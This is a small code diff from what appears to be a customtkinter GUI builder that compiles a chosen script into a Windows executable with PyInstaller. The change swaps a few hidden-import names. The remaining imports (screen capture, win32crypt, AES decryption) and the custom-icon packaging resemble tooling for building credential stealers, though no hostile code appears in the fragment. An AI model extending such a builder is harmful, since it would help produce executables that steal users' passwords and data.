@@ -434,8 +434,7 @@ class App(customtkinter.CTk):
                             "--hidden-import", "psutil",
                             "--hidden-import", "PIL",
                             "--hidden-import", "PIL.ImageGrab",
-                            "--hidden-import", "Crypto",
-                            "--hidden-import", "Crypto.Cipher.AES",
+                            "--hidden-import", "pycryptodome",
                             "--hidden-import", "win32crypt",
                             "--icon", exeicon, f"./{filename}.py"])
 
